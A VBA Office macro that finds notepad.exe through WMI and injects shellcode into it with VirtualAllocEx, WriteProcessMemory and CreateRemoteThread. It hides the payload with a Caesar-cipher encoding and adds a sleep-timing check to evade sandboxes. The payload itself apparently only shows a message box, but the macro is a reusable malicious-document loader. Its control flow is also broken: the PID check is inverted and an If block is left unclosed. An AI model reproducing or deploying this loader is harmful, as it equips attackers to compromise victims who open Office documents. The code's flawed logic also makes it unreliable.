' Currently set to work for x64 office but import declarations are added below for x32
#If Win64 And VBA7 Then
    Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function GetCurrentProcess Lib "KERNEL32" () As LongPtr
    Private Declare PtrSafe Function OpenProcess Lib "KERNEL32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As LongPtr
    Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
    Private Declare PtrSafe Function CreateRemoteThread Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpThreadAttributes As Any, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr

#Else
    Private Declare Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare Function GetCurrentProcess Lib "KERNEL32" () As LongPtr
    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
    Private Declare Function OpenProcess Lib "KERNEL32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As LongPtr
    Private Declare Function CreateRemoteThread Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpThreadAttributes As Any, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
#End If


Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

' https://stackoverflow.com/a/44075973
Public Function getPID() As Integer

    Dim objServices As Object, objProcessSet As Object, Process As Object
    Dim PID As Integer

    Set objServices = GetObject("winmgmts:\\.\root\CIMV2")
    Set objProcessSet = objServices.ExecQuery("SELECT ProcessID, name FROM Win32_Process WHERE name = ""notepad.exe""", , 48)

    'you may find more than one processid depending on your search/program
    For Each Process In objProcessSet
        PID = Process.processId
    Next

    Set objProcessSet = Nothing
    getPID = PID
    
End Function



Function mymacro()
    ' Store shellcode
    Dim buf As Variant
    
    ' Store addresses of memory pointers
    ' laddr = local
    ' raddr = target process addr
    Dim laddr As LongPtr
    Dim raddr As LongPtr
    
    ' Incrementer and holders for Win32 APIs
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    ' PID of target process
    Dim PID As Integer
    
    ' Store handles for target process
    Dim cProcess As LongPtr
    Dim pHandle As LongPtr
    
    ' WriteProcessMemory()
    Dim WriteMem As Long
    
    PID = getPID()
    
    If PID = 0 Then
        Debug.Print "[*] PROCESS ID: " & PID
    Else
        Exit Function
        
    Dim t1 As Date ' start timer
    Dim t2 As Date ' end timer
    Dim time As Long ' hold value

    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    
    If time < 2 Then
        Exit Function
    End If

    ' Handle for remote process
    pHandle = OpenProcess(&H1F0FFF, 0, PID)
    Debug.Print "[*] Process Handle: " & Hex(pHandle)

    ' Use the VBA encrypted caesar cipher shellcode builder
    ' Reference section 6.7
    buf = Array(27, 103, 160, 3, 15, 30, 30, 30, 7, 239, 31, 31, 31, 96, 112, 96, 111, 113, 112, 117, 103, 80, 241, 132, 103, 170, 113, 127, 93, 103, 170, 113, 55, 93, 103, 170, 113, 63, 93, 103, 170, 145, 111, 93, 103, 46, 214, 105, 105, 108, _
80, 232, 103, 80, 223, 203, 91, 128, 155, 33, 75, 63, 96, 224, 232, 44, 96, 32, 224, 1, 12, 113, 96, 112, 93, 103, 170, 113, 63, 93, 170, 97, 91, 103, 32, 239, 93, 170, 159, 167, 31, 31, 31, 103, 164, 223, 147, 142, 103, 32, _
239, 111, 93, 170, 103, 55, 93, 99, 170, 95, 63, 104, 32, 239, 2, 123, 103, 30, 232, 93, 96, 170, 83, 167, 103, 32, 245, 108, 80, 232, 103, 80, 223, 203, 96, 224, 232, 44, 96, 32, 224, 87, 255, 148, 16, 93, 107, 34, 107, 67, _
39, 100, 88, 240, 148, 245, 119, 93, 99, 170, 95, 67, 104, 32, 239, 133, 93, 96, 170, 43, 103, 93, 99, 170, 95, 59, 104, 32, 239, 93, 96, 170, 35, 167, 103, 32, 239, 96, 119, 96, 119, 125, 120, 121, 96, 119, 96, 120, 96, 121, _
103, 162, 11, 63, 96, 113, 30, 255, 119, 96, 120, 121, 93, 103, 170, 49, 8, 104, 30, 30, 30, 124, 104, 230, 224, 31, 31, 31, 31, 93, 103, 172, 180, 57, 32, 31, 31, 93, 107, 172, 164, 71, 32, 31, 31, 103, 80, 232, 96, 217, _
100, 162, 117, 38, 30, 244, 218, 255, 60, 73, 41, 96, 217, 197, 180, 220, 188, 30, 244, 103, 162, 227, 71, 91, 37, 155, 41, 159, 26, 255, 148, 36, 218, 102, 50, 145, 142, 137, 31, 120, 96, 168, 249, 30, 244, 103, 132, 139, 139, 142, _
63, 118, 142, 145, 139, 131, 63, 64, 31, 108, 132, 146, 146, 128, 134, 132, 97, 142, 151, 31)

    ' Caesar cipher here
    ' Value: 31
    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 31
    Next i

    Debug.Print "[*] Size of shellcode: " & UBound(buf)
    
    ' Current process handle
    cProcess = GetCurrentProcess()

    laddr = VirtualAllocEx(cProcess, 0, UBound(buf), &H3000, &H4)
    raddr = VirtualAllocEx(pHandle, 0, UBound(buf), &H3000, &H40)
    
    Debug.Print "[+] Pointer to local VirtualAllocEx: 0x" & Hex(laddr)
    Debug.Print "[+] Pointer to target process VirtualAllocEx: 0x" & Hex(raddr)

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(laddr + counter, data, 1)
    Next counter
    
    WriteMem = WriteProcessMemory(pHandle, raddr, laddr, UBound(buf), 0&)
    
    res = CreateRemoteThread(pHandle, 0&, 0&, raddr, 0, 0, 0&)
    
End Function


